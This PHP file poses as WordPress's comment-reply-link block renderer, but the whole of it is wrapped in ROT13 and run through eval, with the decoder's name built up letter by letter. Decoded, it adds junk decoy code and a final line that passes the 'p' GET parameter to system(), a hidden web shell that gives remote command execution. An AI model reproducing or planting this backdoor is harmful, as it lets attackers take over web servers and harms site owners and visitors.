<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/pbzzrag-ercyl-yvax` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/pbzzrag-ercyl-yvax` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 * @erghea fgevat Erghea gur cbfg pbzzrag'f ercyl yvax.
 */
shapgvba eraqre_oybpx_pber_pbzzrag_ercyl_yvax( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( ! vffrg( $oybpx->pbagrkg['pbzzragVq'] ) ) {
		erghea '';
	}

	$guernq_pbzzragf = trg_bcgvba( 'guernq_pbzzragf' );
	vs ( ! $guernq_pbzzragf ) {
		erghea '';
	}

	$pbzzrag = trg_pbzzrag( $oybpx->pbagrkg['pbzzragVq'] );
	vs ( rzcgl( $pbzzrag ) ) {
		erghea '';
	}

	$qrcgu     = 1;
	$znk_qrcgu = trg_bcgvba( 'guernq_pbzzragf_qrcgu' );
	$cnerag_vq = $pbzzrag->pbzzrag_cnerag;

	// Pbzchgr pbzzrag'f qrcgu vgrengvat bire vgf naprfgbef.
	juvyr ( ! rzcgl( $cnerag_vq ) ) {
		++$qrcgu;
		$cnerag_vq = trg_pbzzrag( $cnerag_vq )->pbzzrag_cnerag;
	}

	$pbzzrag_ercyl_yvax = trg_pbzzrag_ercyl_yvax(
		neenl(
			'qrcgu'     => $qrcgu,
			'znk_qrcgu' => $znk_qrcgu,
		),
		$pbzzrag
	);

	// Eraqre abguvat vs gur trarengrq ercyl yvax vf rzcgl.
	vs ( rzcgl( $pbzzrag_ercyl_yvax ) ) {
		erghea;
	}

	$pynffrf = neenl();
	vs ( vffrg( $nggevohgrf['grkgNyvta'] ) ) {
		$pynffrf[] = 'unf-grkg-nyvta-' . $nggevohgrf['grkgNyvta'];
	}
	vs ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) {
		$pynffrf[] = 'unf-yvax-pbybe';
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => vzcybqr( ' ', $pynffrf ) ) );

	erghea fcevags(
		'<qvi %1$f>%2$f</qvi>',
		$jenccre_nggevohgrf,
		$pbzzrag_ercyl_yvax
	);
}

/**
 * Ertvfgref gur `pber/pbzzrag-ercyl-yvax` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 */
shapgvba ertvfgre_oybpx_pber_pbzzrag_ercyl_yvax() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/pbzzrag-ercyl-yvax',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_pbzzrag_ercyl_yvax',
		)
	);
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_pbzzrag_ercyl_yvax' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>